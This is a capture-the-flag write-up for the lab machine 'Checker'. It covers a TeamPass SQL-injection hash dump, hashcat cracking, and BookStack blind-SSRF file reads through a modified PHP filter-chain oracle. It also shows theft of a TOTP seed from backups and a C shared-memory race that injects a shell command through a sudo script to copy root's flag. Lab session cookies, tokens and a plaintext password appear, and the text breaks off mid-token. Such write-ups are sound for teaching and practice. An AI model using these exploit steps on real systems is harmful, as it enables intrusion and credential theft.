# Checker

- IP: 10.10.11.56

# Reconnaissance

## Nmap

```
➜  checker sudo nmap -sS -sU -vv 10.10.11.56
Discovered open port 80/tcp on 10.10.11.56
Discovered open port 22/tcp on 10.10.11.56
Discovered open port 8080/tcp on 10.10.11.56
```

## /etc/hosts

The following was added to the /etc/hosts file in order to be able to resolve it.

```
10.10.11.56 checker.htb
```

## Browsing

`http://checker.htb/` is running an application called `BookStack`.   

`http://checker.htb:8080/` shows another application called `TeamPass`.  

## Fuzzing

After establishing that both port `80` and `8080` were webapps, I started fuzzing
with different wordlists on both checker.htb:80 and checker.htb:8080, below are some examples that I used.

### checker.htb:80

```
$ ffuf -recursion --recursion-depth=10 -u http://checker.htb/FUZZ -w ~/repos/SecLists/Discovery/Web-Content/common.txt -o common.json
[output omitted]
```

### checker.htb:8080

```
$ ffuf -recursion --recursion-depth=10 -u http://checker.htb:8080/FUZZ -w ~/repos/SecLists/Discovery/Web-Content/common.txt -o common_8080.json
[output omitted]
```

The fuzzing did not give me much of value for either of the endpoints, so I went on to manually poke around. 

## Finding the Version of TeamPass & Vulnerabilities

There is a changelog at  
http://checker.htb:8080/changelog.txt which shows the copyright  
  
which is 2009-2022, so I went on to find what versions were released during 2022.

The latest version released in 2022 is version 3.0.0.21 

as per this link https://github.com/nilsteampassnet/TeamPass/releases?page=3.

Next I googled what vulnerabilities are present for versions below 3.0.0.22 (i.e one version higher than the one I found) and CVE-2023-1545 seemed to be a good one. I also found a poc for it https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612.

# Gaining Access to TeamPass & BookStack
Using the [poc](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612) I got

```
➜  checker ./poc http://checker.htb:8080       
There are 2 users in the system:
admin: [omitted]
bob: [omitted]
```

i.e the users `admin` and `bob` as well as their password hashes.

Next I added them to a file together with their username

```
➜  checker cat hash.txt 
bob:[omitted]
admin:[omitted]
```

and then I had to determine what type of hashes these were, but starting hashcat with autodetect revealed some options.

```
➜  checker hashcat hash.txt ~/repos/SecLists/Passwords/rockyou.txt         
hashcat (v6.2.6) starting in autodetect mode
[output omitted]

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

Mode `3200` seems like a good bet.

```
➜  checker hashcat -m 3200 hash.txt ~/repos/SecLists/Passwords/rockyou.txt --user
hashcat (v6.2.6) starting
[output omitted]

[hash omitted]:[password output omitted]
[output omitted]
```

The password for user `bob` was easy enough, but the password for `admin` seemed tedious to crack so I left it alone. Logging in with the user `bob` via `http://checker.htb:8080` revealed some stuff, namely the ssh password and username 

as well as the username and password to the other site Bookstack at `http://checker.htb/`  
.

When attempting the ssh login it required a validation code, so that was left alone, too.

```
➜  checker ssh reader@10.10.11.56
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
```

Instead I tried the BookStack credentials, which worked.  

That's great, but the page didn't seem to contain much interesting stuff, (except that the user seemed to be logged in and actively doing things).

However, under the Teampass profile, an API token was found  

And here I got caught in the first 'rabbit hole'. For more details about this, please refer to the section '**Things That Didn't Work**' at the end of this document. From that I concluded (for the moment at least) that there was nothing more to gained from TeamPass,  as there didn't seem to be any items for the admin user anyway, and the only items I could find within the database were the ones visible for 'bob'. So I went on to concentrate on Bookstack.

# User Flag

When I looked at the page source I found the version of Bookstack in two places, for example here.  

The version seemed to be vulnerable to plenty of things, one of which is CVE-2023-6199, a Local File Read (LFR) via Blind Server-Side Request Forgery (SSRF). Here I ended up in my *second* rabbit hole. (More details under the section '**Things That Didn't Work**'). Although I couldn't get it to work, I gained valuable intelligence that were then used in my next attempt.

I found another poc:  
https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/

So I tried that too. This time I opted to use burp because it's a bit prettier and easier to work with.

Step 1: I modified the code downloaded from https://github.com/synacktiv/php_filter_chains_oracle_exploit so that it correctly formatted my payloads.

```python
filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
# DEBUG print(filter_chain)
merged_data = self.parse_parameter(filter_chain)
tmp = merged_data["html"]
merged_data["html"] = f"<img src='data:image/png;base64,{base64.b64encode(tmp.encode("utf-8")).decode("utf-8")}'/>"
```

Step 2: I created a book and opened a page.  

Step 3: I checked the burp proxy for the PUT request(s) for `save-draft`  
)

Step 4: I used my modified version of `filters_chain_oracle_exploit.py` with the cookie for `bookstack_session` that I found in the request via burp, as well as the XSRF-TOKEN. Then I made sure the requests were sent as `application/json`. I also let the requests be sent via the burp proxy and targetted `/etc/hosts` just to test it.

```
➜  php_filter_chains_oracle_exploit git:(main) ✗ ./filters_chain_oracle_exploit.py --target "http://checker.htb/ajax/page/9/save-draft" --file '/etc/hosts' --verb PUT --parameter html --proxy http://localhost:8080 --headers '{"X-CSRF-TOKEN":"L1u7fdm3rsNYrkMyqSRUXVlb7QT4A7yKz2AG1PY5","Content-Type":"application/json","Cookie":"bookstack_session=eyJpdiI6ImljbWNuS1Z6ZTdlNUx4VFZXK3Q4bGc9PSIsInZhbHVlIjoidXBKbHdjcFF4U3VQS25qYXhjdUY5Z2RVcTN3V0pzZHFLalovb2QrVXI1RnBKRG54TFdsVlB1MUlGdjV2T0gzRnBDUmV5MkhwaktGT3owTHZIZGJwQUpybW1tOC85dmgyTDJYUjRKQzQ2RFZEaHBoV0xTb3VldzF0V2RaS3d4aVoiLCJtYWMiOiI3NmRiODlhYTg5MmQzYjQ0ZTc4YjE5MzRiZmVkODJhYTVmNDdhYmExNzVhYzc1OTE1MzhiMWU4MmI4NTUwNTZiIiwidGFnIjoiIn0%3D"}'
```

I decided to stop because it took an *excruciatingly* long time to get one file. But it worked! ✅

```
[*] The following URL is targeted : http://checker.htb/ajax/page/9/save-draft
[*] The following local file is leaked : /etc/hosts
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN":"L1u7fdm3rsNYrkMyqSRUXVlb7QT4A7yKz2AG1PY5","Content-Type":"application/json","Cookie":"bookstack_session=eyJpdiI6ImljbWNuS1Z6ZTdlNUx4VFZXK3Q4bGc9PSIsInZhbHVlIjoidXBKbHdjcFF4U3VQS25qYXhjdUY5Z2RVcTN3V0pzZHFLalovb2QrVXI1RnBKRG54TFdsVlB1MUlGdjV2T0gzRnBDUmV5MkhwaktGT3owTHZIZGJwQUpybW1tOC85dmgyTDJYUjRKQzQ2RFZEaHBoV0xTb3VldzF0V2RaS3d4aVoiLCJtYWMiOiI3NmRiODlhYTg5MmQzYjQ0ZTc4YjE5MzRiZmVkODJhYTVmNDdhYmExNzVhYzc1OTE1MzhiMWU4MmI4NTUwNTZiIiwidGFnIjoiIn0%3D"}
MTI3LjAuMC4xIGxvY2FsaG9zdAoxMjcuMC4xLjEgY2hlY2tlcgoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGlwNi1sb2NhbGhvc3QgaXA2LWxvb3Bi
b'127.0.0.1 localhost\n127.0.1.1 checker\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopb'

```

Instead, I did the above but for other interesting files. Because I knew the ssh user is called `reader` I decided to try to get `/home/reader/user.txt` directly, but that didn't work. Neither did `/etc/shadow`. You guessed it, here I entered my *third* rabbit hole. (More details under the section '**Things That Didn't Work**'). 

By now I figured out that in order to effectively utilize this exploit, I had to concentrate on files with little content (if possible), as well as using it more like an enumeration device to gain more information and insight (was a file is possible to download or not). In order to do that though, I had to create a list of files that could be of interest apart from the ones I already checked, with one goal in mind: **break the SSH OTP**. 

## Breaking the SSH OTP

Since I was looking for any and all information remotely in regard to the **SSH OTP** I searched through the relevant github repositories for BookStack and TeamPass for keywords such as **otp**, **mfa**, **code**, **private key**, **auth** and more, as well as scouring the page sources.

In the page source for `checker.htb:8080` I found:

```
   function showMFAMethod() {
        var twoFaMethods = (parseInt(store.get('teampassSettings').google_authentication) === 1 ? 1 : 0) +
            (parseInt(store.get('teampassSettings').agses_authentication_enabled) === 1 ? 1 : 0) +
            (parseInt(store.get('teampassSettings').duo) === 1 ? 1 : 0) +
            (parseInt(store.get('teampassSettings').yubico_authentication) === 1 ? 1 : 0);
```

So likely one of these three are used with TeamPass if enabled, which doesn't guarantee anything about the SSH OTP mechanism, but at least it's *something*. When trying to get common configuration files for each of these (with the LFI SSRF exploit) none of them worked, for example:

- `~/.google_authenticator`
- `~/.config/Yubico/u2f_keys`
- `/etc/duo/pam_duo.conf`
- `/home/reader/.google_authenticator`
- `/home/reader/.config/Yubico/u2f_keys`

Again I went back to scratch and started poking around **TeamPass** where I found that when clicking the logo while logged in with **bob** it attempted to redirect me to **vault.checker.htb**. After adding it to `/etc/hosts` I started going down my *fourth* rabbit hole. (More details under the section '**Things That Didn't Work**').

Since I couldn't find any configuration files for the **OTP** I figured it was either that I lacked permissions or that the files were located in a non-standard path. To narrow it down, I attempted to get ANY file that a user typically has in their home folder, such as `/home/reader/.bashrc`,  `/home/reader/.bash_profile`, `/home/reader/.profile`, `home/reader/.bash_history`, `/home/reader/.ssh/known_hosts` and more. Since none of those files were found, I thought that it was simply an issue with permissions.

Okay, but what about **backups**? Sometimes admins decide to implement backups for users, especially their home folders. These are typically located in `/backup/home_backup`, so I attempted to get files from there instead, i.e via `/backup/home_backup/home/reader/`, only this time, it worked. Now, naturally I tried multiple files, but eventually I managed to get the file `.google_authenticator`.

 ```
[*] The following URL is targeted : http://checker.htb/ajax/page/9/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN":"b6eLvHkuRFyVIAJTfK2fo6ot6pAHzzrYNIErc3ds","Content-Type":"application/json","Cookie":"bookstack_session=eyJpdiI6IlVwdFVFQ0VQNzA3SlNJUkJsdDhEK1E9PSIsInZhbHVlIjoiNk5EVzhRcVY1QjFPSU8yY1UyQkFTcVQxMWFkbkZVeU5DbnlhYkNnMzlPdytoSVJrTWJWUGt1ZTh4YmJ5emNxaytsenBwaDFXb0NveTBOdFlBbmppc0pPSVhDc2ZlODd6enRjdEVmallwWTB0ZEppV2FyOTZRMlN1bzVaeTF3YkciLCJtYWMiOiIwYTM0NTZmMDY1ZWNkYTcwMDY3NzlmYWM3NjEyNzg5MmE4Nzk0OTAxMGYyNDZkMjZiOWJiNzk5Yzc4M2VjYWI0IiwidGFnIjoiIn0%3D"}
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
[b64 omitted]
b'[omitted]\n" [omitted]\n
```

I found the key for the google authenticator OTP mechanism. ✅

### Generating OTP
To generate the OTP I deviced a simple python script that depends on `pyotp`.

```
import pyotp
key = "[omitted]"
otp = pyotp.TOTP(key)
print(otp.now())
```

When I tried the generated key I got the following response from the server:
```
➜  ~ ssh reader@10.10.11.56
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
Error "Operation not permitted" while writing config
```
Okay, but to make sure the code wasn't simply *wrong*, I tested a deliberetly wrong code and got:
```
➜  ~ ssh reader@10.10.11.56
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
(reader@10.10.11.56) Password: 
```
I.e no error message.That must mean the code was in fact correct. 

When generating TOTPs (Time-Based One-Time Password), the name already discloses an important factor: **the time**. I checked the date of the server and could see it was in GMT while mine was in UTC and slightly different, so in order to sync it I created the following command:

```
➜  checker sudo date -u -s "$(curl -I http://vault.checker.htb 2>/dev/null | rg ^Date: | cut -d' ' -f2-)"
```

I verified that the time was indeed synced and generated the **TOTP** again:
```
➜  ~ ssh reader@10.10.11.56
(reader@10.10.11.56) Password: 
(reader@10.10.11.56) Verification code: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Last login: Sun Mar 2 04:20:38 2025 from 10.10.16.10
reader@checker:~$ 
```

And just like that, I got the **user flag** 
```
reader@checker:~$ cat user.txt 
[omitted]
```

# Root flag

Once I had ssh access I deciced to do some recon for permissions.

```
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

Okay so `reader` has sudo for `check-leak.sh`.

## check-leak.sh

```
reader@checker:~$ cat /opt/hash-checker/check-leak.sh 
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```

This was obviously my entry for a privilege escalation, but I had no idea how the binary `/opt/hash-checker/check_leak` worked, so I decided to copy it to my machine

```
➜  checker scp reader@10.10.11.56:/opt/hash-checker/check_leak .
```

and analyze it using **Ghidra**. 

## Ghidra Analysis

I could see from the code that it checks with `check_bcrypt_in_file` if the password hash for the provided user found in the database is the same as any of the password hashes in the leaked_hashes.txt file. If it is leaked, the password hash is temporarily stored at a specific memory address (via the contents in `__ptr`, i.e the specific hash). This is also conveniently printed out for the user. When testing it for `bob`, I could see:

```
reader@checker:/opt/hash-checker$ sudo ./check-leak.sh "bob"
Password is leaked!
Using the shared memory 0x2D97C as temp location
User will be notified via bob@checker.htb
```

When I listed the shared memory segments at the same second as was in shared memory (there's a 1 second sleep), I could see it as:

```
reader@checker:~$ ipcs -m

------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status      
0x000bb58f 10         root       666        1024       0   
```

I also noted from the decompiled **main** function, that after sleeping it calls another function **notify_user** with the shared memory address.

Here, some noteworthy things are happening. 

1. It checks if it could attach to the shared memory segment. If not it exits with an error.
2. If the string 'Leaked hash detected' is found in `__haystack`, a pointer to the first occurance of the string is assigned to `pcVar4`. Otherwise it prints out "No hash detected in shared memory".
3. It checks if it can find `0x3e` (i.e the character `>`) in `pcVar4`  and moves the pointer to the first occurance of that character. If the character didn't exist, it exits with an error. Otherwise `pcVar4` now points to that character in the string.
4. It moves the pointer one step to the right (i.e to the first character after  `>`) and calls. `trim_bcrypt_hash` and assigns the return value to `uVar5`.
5. It performs a `mysql` query where the value of `uVar5` is assigned to `%s`.

A thought was born. **If I could control the value of `uVar5` I could inject a trailing command after the mysql query.**

## Shared memory manipulation
I noticed I had access to `gcc`, so I figured I'd create a C script to try and attach to the shared memory segment in order to attempt to modify it. We know that it has a sleep for 1 second after creating the shared memory, so this should in theory be possible.

I deviced a C script:
```C
reader@checker:~$ cat manipulate.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>

#define SHM_SIZE 1024

int get_shmid_from_ipcs() {
    FILE *fp;
    char buffer[256];
    int shmid = -1;

    // Run the `ipcs -m` command
    fp = popen("ipcs -m", "r");
    if (fp == NULL) {
        perror("popen");
        return -1;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, "0x") != NULL) {
            sscanf(buffer, "%*s %d", &shmid);
            break;
        }
    }

    pclose(fp);
    return shmid;
}

int main() {
    int shmid;
    char *shmaddr;

    printf("Waiting for shared memory segment to appear...\n");
    while (1) {
        // Get the shmid from the `ipcs -m` output
        shmid = get_shmid_from_ipcs();
        if (shmid == -1) {
            sleep(0.1);
            continue;
        }

        printf("Found shared memory segment (shmid: %d)\n", shmid);

        // Attach to shared memory segment
        shmaddr = (char *)shmat(shmid, NULL, 0);
        if (shmaddr == (char *)-1) {
            perror("shmat");
            exit(1);
        }

        printf("Attached to shared memory segment\n");

        const char *payload = "Leaked hash detected>[bobs hash]\"\'; cp /root/root.txt /home/reader/root.txt && chown reader /home/reader/root.txt; echo \'\"";

        strncpy(shmaddr, payload, SHM_SIZE - 1);
        shmaddr[SHM_SIZE - 1] = '\0';
		
        printf("Data written to shared memory: %s\n", shmaddr);
        shmdt(shmaddr);
        break;
    }
    return 0;
}
```

Noteworthy here is that I played around with this by first sending a non-malicious, correctly formatted payload. From studying the code for **main** and **notify_user** it is possible to see that if the password hash found in the database for the user is equal to any of the hashes located in `leaked_hashes.txt`, it gets placed in shared memory. So a correctly formatted payload looks like `Leaked hash detected>[leaked hash corresponding to the username]`.

### Performing the exploit
I compiled my code and ran it
```
reader@checker:~$ gcc -o shm_manipulation manipulate.c 
reader@checker:~$ ./shm_manipulation 
Waiting for shared memory segment to appear...
```

and in another terminal tab I called the `check-leak.sh` script.
```
reader@checker:/opt/hash-checker$ sudo ./check-leak.sh "bob"
Password is leaked!
Using the shared memory 0x303AD as temp location
sh: 1: echo: echo: I/O error
User will be notified via bob@checker.htb
```

From output of my code I saw
```
Waiting for shared memory segment to appear...
Found shared memory segment (shmid: 28)
Attached to shared memory segment
Data written to shared memory: Leaked hash detected>[bobs hash]"'; cp /root/root.txt /home/reader/root.txt && chown reader /home/reader/root.txt; echo '"
```

and then
```
reader@checker:~$ ls
manipulate.c  root.txt  shm.c  shm_access  shm_manipulation  user.txt
reader@checker:~$ cat root.txt
[omitted]
```

All flags obtained. ✅ Mission successfully completed. ✅

# Things That Didn't Work

## Rabbit Hole 1

The documentation for the TeamPass API suggests it is only about a simple GET request https://teampass.readthedocs.io/en/latest/api/api-read/  
with the `apikey` set to a valid key. As well as https://github.com/nilsteampassnet/teampass_doc/blob/master/docs/api/api-read.md.  
username: bob  
PW: [omitted]  
apikey: [omitted]

It seemed that the apikey is invalid
```
➜  checker curl -X POST http://checker.htb:8080/api/index.php/authorize -d '{
    "login": "bob",
    "password": "[omitted]",
    "apikey": "[omitted]"
}'
{"error":"Login failed.","apikey":"Not valid"}%                       
```

It did not work as a Token/Bearer either:

```
➜  checker curl -X GET "http://checker.htb:8080/api/index.php/item/inFolders?folders={1,2}" -H "Authorization: Token [omitted]" 
{"error":"Access denied"}{"error":"Access denied"}%
```

However, since it is an older version of TeamPass, I poked around on `web.archive.org` and found documentation for the older versions of the api. But this did not work either as expected.
https://web.archive.org/web/20221127043850/https://documentation.teampass.net/#/api-basic?id=authorize

Updating admin PW via sql injection did not work.  
However the following works. (source in the sourcecode for https://github.com/nilsteampassnet/TeamPass/blob/3.0.0.21/sources/items.queries.php)

- dbquery=$(exec_sql "SELECT public_key FROM teampass_users where login = 'admin'")
- dbquery=$(exec_sql "SELECT private_key FROM teampass_users where login = 'admin'")
- dbquery=$(exec_sql "SELECT label FROM teampass_items LIMIT 1")
- dbquery=$(exec_sql "SELECT login FROM teampass_items LIMIT 1 OFFSET 1")

## Rabbit Hole 2

I used the POC from the following link https://fluidattacks.com/advisories/imagination/
First I started an OOB listener:

```
➜  bin ./interactsh-client -config config.yaml

    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io

[INF] Current interactsh version 1.2.3 (latest)
[INF] Listing 1 payload for OOB Testing
[INF] cuutkkm9h13gjfcdlcf0g6ckazxgd9rts.oast.pro

```

Then I crafted my payload

```
➜  checker echo "https://cuv7p1u9h13nhpgmeijgbjeabab4h9kda.oast.me/image.png" | base64                                                                                 
aHR0cHM6Ly9jdXY3cDF1OWgxM25ocGdtZWlqZ2JqZWFiYWI0aDlrZGEub2FzdC5tZS9pbWFnZS5w
bmcK
➜  checker echo "<img src='data:image/png;base64,x'/>" | awk -F"x" '{print $1 "aHR0cHM6Ly9jdXY3cDF1OWgxM25ocGdtZWlqZ2JqZWFiYWI0aDlrZGEub2FzdC5tZS9pbWFnZS5wbmcK" $2}'
<img src='data:image/png;base64,aHR0cHM6Ly9jdXY3cDF1OWgxM25ocGdtZWlqZ2JqZWFiYWI0aDlrZGEub2FzdC5tZS9pbWFnZS5wbmcK'/>

```

After that I created a page in a book  
  
and made sure to intercept the requests for `save-draft`. Here, I kept sorting through the different requests until I hit a `PUT` request:  

Then I replaced the contents of the page to the exploit payload

and lastly I sent the request and checked the OOB listener. However, this did not seem to work, and I concluded that after trying many different ways to get it to work such as different encoding and request `Content-Type` as well. So naturally, back to scratch I went. 

## Rabbit hole 3

 I started downloading `/etc/passwd`, `/etc/ssh/sshd_config`, `/etc/issue`, `/etc/pam.d/sshd`, `/etc/hosts` and `/etc/apache2/apache2.conf`. I decided to risk it and get all of the simultaneously because it took a very long time. However, due to the fact that the files took so long to download, eventually the session got dropped which meant the exposed content wasn't complete. 

From the information that I did get, I couldn't find much interesting stuff either.

 I decided to check for what command line arguments were used (if any) to run sshd by first finding the `pid` for `sshd`:

```
➜  php_filter_chains_oracle_exploit git:(main) ✗ ./filters_chain_oracle_exploit.py --target "http://checker.htb/ajax/page/8/save-draft" --file "/var/run/sshd.pid" --verb PUT --parameter html --proxy http://localhost:8080 --headers '{"X-CSRF-TOKEN":"V8AXBiirQ6HYX3mDfV44y2EtoPiAKnfyu4Atk1KA","Content-Type":"application/json","Cookie":"bookstack_session=eyJpdiI6IjZHWllqcjEzYnc3WDdhRUs5WVVDTEE9PSIsInZhbHVlIjoiY2JLUlV1eWJzQXJmYTZ6OGgzTndIUHd4QmF5VGx1R1BSUGMyZHdtNFRDZEZaQUFaM3BpRmxicG5hVlYyRjFCTzh6cDAxWHEzWGNJeEs2bDZiQzYraHJGRHFzOUpnNnhUaU9OWDlBOW1MQUpMNWxHeEljalk5VHlYdGJKNmRmR28iLCJtYWMiOiI0Zjg1ZjhjN2I0NzExNGJiMGFhNGViY2VmZjliMjBkY2VjMjQ5OTExMGJiNWNiYjRiYjUyNmI4OGRmNmNhODJiIiwidGFnIjoiIn0%3D"}'        
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /var/run/sshd.pid
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN":"V8AXBiirQ6HYX3mDfV44y2EtoPiAKnfyu4Atk1KA","Content-Type":"application/json","Cookie":"bookstack_session=eyJpdiI6IjZHWllqcjEzYnc3WDdhRUs5WVVDTEE9PSIsInZhbHVlIjoiY2JLUlV1eWJzQXJmYTZ6OGgzTndIUHd4QmF5VGx1R1BSUGMyZHdtNFRDZEZaQUFaM3BpRmxicG5hVlYyRjFCTzh6cDAxWHEzWGNJeEs2bDZiQzYraHJGRHFzOUpnNnhUaU9OWDlBOW1MQUpMNWxHeEljalk5VHlYdGJKNmRmR28iLCJtYWMiOiI0Zjg1ZjhjN2I0NzExNGJiMGFhNGViY2VmZjliMjBkY2VjMjQ5OTExMGJiNWNiYjRiYjUyNmI4OGRmNmNhODJiIiwidGFnIjoiIn0%3D"}
[+] File /var/run/sshd.pid leak is finished!
MTEx
b'111'
```

With the pid in hand I attempted to expose things like `/proc/111/stat`, `/proc/111/status` and more. From the output of `/proc/111/cmdline` however, I could see that the pid 111 did not even belong to sshd, and since I only had an LFR (I tried injecting commands in the path) I abandoned this.

## Rabbit hole 4

After poking around Teampass, I noticed that if you click the logo with the logged in user `bob`, it attempts to redirect you to `vault.checker.htb`. A subdomain. I added that to `/etc/hosts` and browsed the page.  

Then I tested the sql injection exploit from earlier which showed it has the same users and credentials. So I logged in with `bob`.  
Nothing here looked different, but I figured it might be time to test the api again which did not work the last time with the normal site, only this time, it worked:

```
➜  checker curl -X POST "http://vault.checker.htb:8080/api/index.php/authorize" -d '{"apikey": "qXEsxMzqCQFsmCp8kjpshnG3u7ESjFrPhhzzMWC", "login": "bob", "password":"cheerleader"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJvYiIsImlkIjoxMDAwMDAwMCwiZXhwIjoxNzQwNTYzNzM5LCJwdWJsaWNfa2V5IjoiTFMwdExTMUNSVWRKVGlCUVZVSk1TVU1nUzBWWkxTMHRMUzBOQ2sxSlNVTkpha0ZPUW1kcmNXaHJhVWM1ZHpCQ1FWRkZSa0ZCVDBOQlp6aEJUVWxKUTBOblMwTkJaMFZCTmtKbFNHeDJjRk5WTDJoS2RFOXFPVEVyY1d3TkNrdHRPVTVWTUhOWlR6TmxTSEUzTlZKaU5XRkpSV1pUWWpWTmVFOXZkRmRKTUZaamRrODVSRmx0TkdkSmRVVk5ibWhyVm1JNGN5OWhkVmN3UnpCQ1pUVU5DbEk0V21oR05rVTBUQzl0WW5WRGRsTjZha3h4YlVFNVQyVm1lbWQxVlZvMWNVczNiR1l4YkVscGMzQm5abXB2TVZCRWNIWXlhWEZKTVhWRlpsY3lNVGNOQ21kU1VuRkpUbkJKWWtoclpVcDVWMnRhVFVSUGF5c3pjRkZEV1d4MkswNVRNMnB5ZFc1SFJtZGFVVVZuYTBaRE9XbDBPVEZGVW14VVQzVm5NR0ZUYTFFTkNrRkxVa2gzYUdkMFUzQk5TV1pyUTFac1NGaG9NVVJhWXpKcEx6Sk9aVzAyU1VWaVIwaG1ialEwWkZScGJ6YzRNbWxWVEd4eFRESllTek5pVlZKbU1XTU5DbWxEVTNJMGQzUllNMjh6V1Vob01IbG9PSGQzUVRsTGVGWlpaMlEwV0RKM1NrYzBORXRvZG1SeWJuVTVXbEZ0TUdoUFZtWjBRWHBCUkhSUFVXOHpWbG9OQ2xaS01XVnBVVmxzYm5SSWRYRnlZbXBIUVdWdWNsTmFhRUkzWkZkRkwzaHBjVzAxYm1JM1kwd3haekpSSzJGSllVbEpSa3RoVnpKYU1rSXZjakJKZFhBTkNtUnRiR05YZFdWMGNXaDFTazQyYVhWdVFtODVOSGgzTTNKTE9EWndVMUYwY3psTFVYZFdlazlYYm1VdlVqZDZZMEZ3UVhGTVVubEZRalJLY2xaMWFXb05DbEY1TVROc0wxWlNiV3RzYlhsUmREbHBjbmRFTVVWQ2VuZHVhVWgxUjNkVlQxTnNkSGwxWVVGVFJVWmxWRFpZVkVoTldpOVJkbE5xYjBVdmNteERZVVVOQ2xOM1JHZEdLekl5Y2xSNlExRlZNell4YTNGTlVFRlNTbmxNZURGYU9FMVdVRTFtV0ZWeVpraEZNRVJhUVc1R00xQnhhVUl5YmxSVWVVdGpTbGxsWVU4TkNtaHdOSE4yU0d4M1VHaEhXRzR4YWtnNWNXZEthWEF5VEV0WmRHeHZRbnBCZEdwa2VqQjJOVGszYmlzeGVHVjFWRkJKVHpGSFdFaEVZbTE1VkhseE1tTU5DbkUzVkRJMFQzYzJZa1psWlRWc1JYcFFWSFpRTW1SclEwRjNSVUZCVVQwOURRb3RMUzB0TFVWT1JDQlFWVUpNU1VNZ1MwVlpMUzB0TFMwPSIsInByaXZhdGVfa2V5IjoiTFMwdExTMUNSVWRKVGlCU1UwRWdVRkpKVmtGVVJTQkxSVmt0TFMwdExRMEtUVWxKU2t0QlNVSkJRVXREUVdkRlFUWkNaVWhzZG5CVFZTOW9TblJQYWpreEszRnNTMjA1VGxVd2MxbFBNMlZJY1RjMVVtSTFZVWxGWmxOaU5VMTRUdzBLYjNSWFNUQldZM1pQT1VSWmJUUm5TWFZGVFc1b2ExWmlPSE12WVhWWE1FY3dRbVUxVWpoYWFFWTJSVFJNTDIxaWRVTjJVM3BxVEhGdFFUbFBaV1o2WncwS2RWVmFOWEZMTjJ4bU1XeEphWE53WjJacWJ6RlFSSEIyTW1seFNURjFSV1pYTWpFM1oxSlNjVWxPY0VsaVNHdGxTbmxYYTFwTlJFOXJLek53VVVOWmJBMEtkaXRPVXpOcWNuVnVSMFpuV2xGRloydEdRemxwZERreFJWSnNWRTkxWnpCaFUydFJRVXRTU0hkb1ozUlRjRTFKWm10RFZteElXR2d4UkZwak1ta3ZNZzBLVG1WdE5rbEZZa2RJWm00ME5HUlVhVzgzT0RKcFZVeHNjVXd5V0VzellsVlNaakZqYVVOVGNqUjNkRmd6YnpOWlNHZ3dlV2c0ZDNkQk9VdDRWbGxuWkEwS05GZ3lkMHBITkRSTGFIWmtjbTUxT1ZwUmJUQm9UMVptZEVGNlFVUjBUMUZ2TTFaYVZrb3haV2xSV1d4dWRFaDFjWEppYWtkQlpXNXlVMXBvUWpka1Z3MEtSUzk0YVhGdE5XNWlOMk5NTVdjeVVTdGhTV0ZKU1VaTFlWY3lXakpDTDNJd1NYVndaRzFzWTFkMVpYUnhhSFZLVGpacGRXNUNiemswZUhjemNrczROZzBLY0ZOUmRITTVTMUYzVm5wUFYyNWxMMUkzZW1OQmNFRnhURko1UlVJMFNuSldkV2xxVVhreE0yd3ZWbEp0YTJ4dGVWRjBPV2x5ZDBReFJVSjZkMjVwU0EwS2RVZDNWVTlUYkhSNWRXRkJVMFZHWlZRMldGUklUVm92VVhaVGFtOUZMM0pzUTJGRlUzZEVaMFlyTWpKeVZIcERVVlV6TmpGcmNVMVFRVkpLZVV4NE1RMEtXamhOVmxCTlpsaFZjbVpJUlRCRVdrRnVSak5RY1dsQ01tNVVWSGxMWTBwWlpXRlBhSEEwYzNaSWJIZFFhRWRZYmpGcVNEbHhaM